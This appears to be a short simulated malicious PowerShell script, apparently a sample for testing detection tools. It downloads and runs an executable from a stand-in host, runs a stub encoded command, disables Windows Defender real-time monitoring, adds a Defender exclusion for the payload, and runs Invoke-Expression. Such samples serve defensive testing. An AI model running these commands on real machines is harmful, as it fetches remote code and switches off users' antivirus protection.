# Simulated malicious PowerShell script
Invoke-WebRequest -Uri "http://malicious-server.com/payload.exe" -OutFile "C:\Users\Public\payload.exe"

# Running a suspicious process
Start-Process "C:\Users\Public\payload.exe"

# Using PowerShell encoded command execution (common malware obfuscation)
powershell -EncodedCommand SQBFAFgA

# Attempting to disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Attempting to add an exclusion to Windows Defender
Add-MpPreference -ExclusionPath "C:\Users\Public\payload.exe"

# Executing arbitrary commands
Invoke-Expression "calc.exe"
